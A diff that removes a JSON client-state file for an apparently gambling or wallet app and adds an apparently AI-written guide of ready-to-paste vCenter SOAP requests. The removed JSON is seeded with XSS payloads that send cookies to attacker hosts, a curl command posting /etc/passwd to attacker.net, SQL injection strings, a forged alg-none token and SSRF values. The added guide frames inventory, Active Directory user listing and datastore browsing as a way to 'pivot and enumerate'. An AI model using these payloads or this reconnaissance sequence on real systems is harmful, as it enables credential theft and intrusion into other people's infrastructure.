@@ -1,179 +1,311 @@
-{
-  "user": {
-    "webToken": {
-      "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoic3VwZXJ1c2VyIn0.signature",
-      "u2token": "pwned-u2token-dnslog"
-    },
-    "userInfo": {
-      "customerId": "13371337",
-      "loginName": "<script src=//x.burpcollaborator.net></script>",
-      "customerType": 9,
-      "starLevel": 9,
-      "mobileNo": "998****337",
-      "token": "eyJ0b2tlbiI6IlRPS0VOU1NIQVJFRCJ9",
-      "noLoginDays": 999,
-      "currency": "PHP",
-      "newAccountFlag": 1,
-      "productId": "C66",
-      "face": true,
-      "verifyLoginIp": true,
-      "onlineBet": true,
-      "bindFlag": true,
-      "gameLimit": false,
-      "fromType": "replay-attack",
-      "toType": "browser-injection",
-      "phone": "<svg/onload=fetch(`https://attacker.burpcollaborator.net?c=`+document.cookie)>",
-      "login": true,
-      "credit": "999999",
-      "gameCredit": 999999,
-      "gameKey": "exfil-dns-collector.attacker.net",
-      "createdDate": "2025-01-01 13:37:00",
-      "flag": "0",
-      "parentId": "1000000000",
-      "nickName": "<img src=x onerror=alert('xss')>",
-      "firstDepositDate": "2025-02-02 13:37:00",
-      "headshot": "<img src=x onerror=fetch('https://api.evil.com/steal?c='+document.cookie)>",
-      "siteId": 6,
-      "isGray": true,
-      "activation": true,
-      "agentFlag": true,
-      "birthday": "1999-09-09",
-      "blackFlag": 1,
-      "branchAddress": "127.0.0.1",
-      "branchCode": "SSRF",
-      "branchName": "EvilBank",
-      "branchPhone": "00000000000",
-      "cashCredit": 31337,
-      "city": "ExploitTown",
-      "customerLevel": 5,
-      "firstDepositFlag": true,
-      "firstIdScan": "ssrf-test",
-      "firstIdStatus": "1",
-      "firstIdType": "3",
-      "firstName": "Hacker",
-      "firstNoType": "99",
-      "gender": "X",
-      "glife": true,
-      "headShot": "javascript:alert(1)",
-      "isLazada": false,
-      "lastLoginDate": "2025-07-15 00:00:00",
-      "lastName": "User",
-      "loginNameFlag": 1,
-      "loginPwdFlag": false,
-      "marginSwitch": false,
-      "mayaFlag": false,
-      "nationality": "Unknown",
-      "newWalletFlag": 1,
-      "oddsType": 4,
-      "product": 1337,
-      "registDate": "2025-01-01 13:37:00",
-      "secondIdType": "9",
-      "secondNoType": "7",
-      "silentPhotoSwitch": true,
-      "whiteListUser": false,
-      "withdrewPwd": false,
-      "missNum": 404
-    },
-    "pay": {
-      "balance": 888888,
-      "balanceFlag": 1,
-      "minWithdrawAmount": 10,
-      "maxWithdrawAmount": 999999
-    },
-    "banksList": [
-      {
-        "bankName": "InjectionBank",
-        "accountName": "Attacker",
-        "accountNumber": "DROP TABLE users;",
-        "bankCode": "SQL1"
-      }
-    ],
-    "face": false,
-    "productId": "C66",
-    "currentTab": 9,
-    "likeGameList": [
-      {
-        "gameId": "9999",
-        "gameName": "<script>alert('xss-in-gameName')</script>",
-        "platformName": "XSSPlatform",
-        "jsonParam": "{\"redirectLink\":\"http://attacker.net/payload\"}",
-        "tryFlag": 1
-      }
-    ],
-    "historyGameList": [],
-    "lastGamePlayed": "9999"
-  },
-  "news": {
-    "activeIndex": 9
-  },
-  "language": {
-    "language": "<img src=x onerror=confirm('lang-xss')>"
-  },
-  "gameUrl": "https://evil.c2.server/game-launch",
-  "faceid": true,
-  "global": {
-    "startPageShow": true,
-    "messageBoxShow": true,
-    "layout_type": 9,
-    "bingoInfo": [],
-    "isShowSideBarSet": true,
-    "bubbleCfg": [
-      {
-        "type": 0,
-        "typeDisplay": "DOM XSS",
-        "bubbleConfigInfoList": [
-          {
-            "location": 0,
-            "locationDisplay": "InjectedBubble",
-            "content": "<svg/onload=alert('bubble-xss')>",
-            "textColor": "#ff0000",
-            "bubbleColor": "#00ff00"
-          }
-        ]
-      }
-    ],
-    "siteInfo": {
-      "clientIp": "10.10.10.10"
-    },
-    "tiktokTracking": {
-      "palcode": true,
-      "viewContent": true,
-      "initiateCheckout": true
-    }
-  },
-  "billDetail": {
-    "xssTest": "<img src=x onerror=alert('bill-xss')>"
-  },
-  "recordDetail": {
-    "fakeField": "<iframe src='http://attacker.net/steal'></iframe>"
-  },
-  "GPOOrder": {
-    "cmd": "curl http://attacker.net --data @/etc/passwd"
-  },
-  "loginStore": {
-    "lastAction": 9,
-    "lastUser": "root' OR '1'='1"
-  },
-  "mayaApplet": {
-    "sessionId": "C2-channel-session",
-    "isFirstDeposit": false,
-    "firstDepositBanner": true,
-    "mayaUserInfo": {
-      "payload": "<svg/onload=alert('maya-xss')>"
-    }
-  },
-  "switch": {
-    "walletTabIndex": 3,
-    "activeCardIndex": 1
-  },
-  "kycStore": {
-    "document": "file:///etc/passwd"
-  },
-  "games": {
-    "debugMode": true,
-    "exploitFlag": true
-  },
-  "gameUrlObj": {
-    "C2Game": "https://dnslog.cn/c2"
-  }
-}
+Awesome — you’ve got a gold mine of Managed Object Refs (MORefs) back (rootFolder group-d1, propertyCollector, viewManager, sessionManager, etc.). Below are ready-to-paste SOAP XML bodies to quickly pivot and enumerate vCenter. I’ll keep each focused and labeled so you can fire them in order.
+
+Tip: After Login, keep and resend the Cookie: vmware_soap_session="..." header with every request.
+
+0) Login and session sanity
+A. SessionManager.Login
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:Login>
+      <_this type="SessionManager">SessionManager</_this>
+      <userName>YOUR_USER</userName>
+      <password>YOUR_PASS</password>
+    </vim25:Login>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+B. SessionManager.SessionIsActive (optional)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:SessionIsActive>
+      <_this type="SessionManager">SessionManager</_this>
+      <sessionID></sessionID>
+      <userName></userName>
+    </vim25:SessionIsActive>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+1) Fast inventory with a ContainerView
+A. ViewManager.CreateContainerView (VMs, Hosts, Datastores in one shot)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:CreateContainerView>
+      <_this type="ViewManager">ViewManager</_this>
+      <container type="Folder">group-d1</container>
+      <type>VirtualMachine</type>
+      <type>HostSystem</type>
+      <type>Datastore</type>
+      <recursive>true</recursive>
+    </vim25:CreateContainerView>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+
+Response returns a new MORef like view-123. Use it below.
+
+B. PropertyCollector.RetrievePropertiesEx (enumerate objects from the view)
+
+This uses a TraversalSpec from the ContainerView’s view property to the contained objects.
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:RetrievePropertiesEx>
+      <_this type="PropertyCollector">propertyCollector</_this>
+      <specSet>
+        <!-- Which properties to fetch -->
+        <propSet>
+          <type>VirtualMachine</type>
+          <pathSet>name</pathSet>
+          <pathSet>guest.ipAddress</pathSet>
+          <pathSet>config.hardware.numCPU</pathSet>
+          <pathSet>config.hardware.memoryMB</pathSet>
+          <pathSet>runtime.powerState</pathSet>
+          <pathSet>summary.config.guestFullName</pathSet>
+        </propSet>
+        <propSet>
+          <type>HostSystem</type>
+          <pathSet>name</pathSet>
+          <pathSet>summary.hardware.cpuModel</pathSet>
+          <pathSet>summary.hardware.numCpuCores</pathSet>
+          <pathSet>summary.hardware.memorySize</pathSet>
+          <pathSet>summary.config.product.fullName</pathSet>
+        </propSet>
+        <propSet>
+          <type>Datastore</type>
+          <pathSet>name</pathSet>
+          <pathSet>summary.capacity</pathSet>
+          <pathSet>summary.freeSpace</pathSet>
+          <pathSet>summary.type</pathSet>
+        </propSet>
+
+        <!-- Where to start + how to walk -->
+        <objectSet>
+          <obj type="ContainerView">view-REPLACE</obj>
+          <skip>false</skip>
+          <selectSet xsi:type="vim25:TraversalSpec" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <name>viewTraversal</name>
+            <type>ContainerView</type>
+            <path>view</path>
+            <skip>false</skip>
+          </selectSet>
+        </objectSet>
+      </specSet>
+      <options/>
+    </vim25:RetrievePropertiesEx>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+2) Deep dives by object type (direct, without a view)
+
+If you prefer using rootFolder directly (works well to list top-level Datacenters):
+
+Datacenters under root
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:RetrievePropertiesEx>
+      <_this type="PropertyCollector">propertyCollector</_this>
+      <specSet>
+        <propSet>
+          <type>Datacenter</type>
+          <pathSet>name</pathSet>
+        </propSet>
+        <objectSet>
+          <obj type="Folder">group-d1</obj>
+          <skip>false</skip>
+        </objectSet>
+      </specSet>
+      <options/>
+    </vim25:RetrievePropertiesEx>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+3) Events & Tasks (great for audit/IR)
+A. EventManager.QueryEvents (last 24h; adjust times)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:QueryEvents>
+      <_this type="EventManager">EventManager</_this>
+      <filter>
+        <time>
+          <beginTime>2025-09-01T00:00:00Z</beginTime>
+          <endTime>2025-09-02T23:59:59Z</endTime>
+        </time>
+      </filter>
+    </vim25:QueryEvents>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+B. TaskManager.RecentTask via PropertyCollector
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:RetrievePropertiesEx>
+      <_this type="PropertyCollector">propertyCollector</_this>
+      <specSet>
+        <propSet>
+          <type>TaskManager</type>
+          <pathSet>recentTask</pathSet>
+        </propSet>
+        <objectSet>
+          <obj type="TaskManager">TaskManager</obj>
+        </objectSet>
+      </specSet>
+      <options/>
+    </vim25:RetrievePropertiesEx>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+
+You’ll get a list of Task MORefs; you can then query each Task for info.name, info.state, info.queueTime, info.entityName, etc.
+
+4) User & auth surface
+A. SessionManager.CurrentSession (who you are)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:CurrentSession>
+      <_this type="SessionManager">SessionManager</_this>
+    </vim25:CurrentSession>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+B. UserDirectory.RetrieveUserGroups (enumerate AD users/groups; adjust domain)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:RetrieveUserGroups>
+      <_this type="UserDirectory">UserDirectory</_this>
+      <domain>YOUR.DOMAIN.TLD</domain>
+      <searchStr>*</searchStr>
+      <belongsToGroup>false</belongsToGroup>
+      <belongsToUser>false</belongsToUser>
+      <exactMatch>false</exactMatch>
+      <findUsers>true</findUsers>
+      <findGroups>true</findGroups>
+    </vim25:RetrieveUserGroups>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+5) Performance counters (baseline + metrics)
+A. PerfManager.QueryPerfCounter (what counters exist)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:QueryPerfCounter>
+      <_this type="PerformanceManager">PerfMgr</_this>
+    </vim25:QueryPerfCounter>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+B. PerfManager.QueryAvailablePerfMetric (what’s available on an entity)
+
+Replace vm-REPLACE with a VM MORef (or host-REPLACE for a host).
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:QueryAvailablePerfMetric>
+      <_this type="PerformanceManager">PerfMgr</_this>
+      <entity type="VirtualMachine">vm-REPLACE</entity>
+      <intervalId>20</intervalId>
+    </vim25:QueryAvailablePerfMetric>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+6) Search helpers (quick pivot)
+SearchIndex.FindByDnsName (VM or Host by FQDN)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:FindByDnsName>
+      <_this type="SearchIndex">SearchIndex</_this>
+      <datacenter xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <dnsName>FQDN.OR.IP.HERE</dnsName>
+      <vmSearch>true</vmSearch>
+    </vim25:FindByDnsName>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+7) Datastore content (list files)
+
+This is a two-step: first get each Datastore’s browser property, then search.
+
+A. Get Datastore.browser
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:RetrievePropertiesEx>
+      <_this type="PropertyCollector">propertyCollector</_this>
+      <specSet>
+        <propSet>
+          <type>Datastore</type>
+          <pathSet>name</pathSet>
+          <pathSet>browser</pathSet>
+        </propSet>
+        <objectSet>
+          <obj type="Folder">group-d1</obj>
+          <skip>false</skip>
+        </objectSet>
+      </specSet>
+      <options/>
+    </vim25:RetrievePropertiesEx>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+
+You’ll get a HostDatastoreBrowser MORef like datastoreBrowser-XYZ.
+
+B. HostDatastoreBrowser.SearchDatastoreSubFolders_Task
+
+Replace [DATASTORE_NAME] and the browser MORef.
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:SearchDatastoreSubFolders_Task>
+      <_this type="HostDatastoreBrowser">datastoreBrowser-REPLACE</_this>
+      <datastorePath>[DATASTORE_NAME]</datastorePath> <!-- e.g. [datastore1] -->
+      <searchSpec/>
+    </vim25:SearchDatastoreSubFolders_Task>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+8) License snapshot (quick view)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:RetrievePropertiesEx>
+      <_this type="PropertyCollector">propertyCollector</_this>
+      <specSet>
+        <propSet>
+          <type>LicenseManager</type>
+          <pathSet>licenses</pathSet>
+        </propSet>
+        <objectSet>
+          <obj type="LicenseManager">LicenseManager</obj>
+        </objectSet>
+      </specSet>
+      <options/>
+    </vim25:RetrievePropertiesEx>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+9) ExtensionManager (installed plugins)
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vim25="urn:vim25">
+  <soapenv:Body>
+    <vim25:RetrievePropertiesEx>
+      <_this type="PropertyCollector">propertyCollector</_this>
+      <specSet>
+        <propSet>
+          <type>ExtensionManager</type>
+          <pathSet>extensionList</pathSet>
+        </propSet>
+        <objectSet>
+          <obj type="ExtensionManager">ExtensionManager</obj>
+        </objectSet>
+      </specSet>
+      <options/>
+    </vim25:RetrievePropertiesEx>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+Send tips
+
+SOAPAction header: set to the API you’re talking to (e.g., urn:vim25/8.0.2.0).
+
+Cookie: after Login, always include Cookie: vmware_soap_session="...".
+
+Pagination: RetrievePropertiesEx can return a token; if present, call ContinueRetrievePropertiesEx with that token to get the next page.
+
+MoRefs: whenever you see an MORef in a response (e.g., view-123, vm-42, host-9), you can target it directly in later calls.
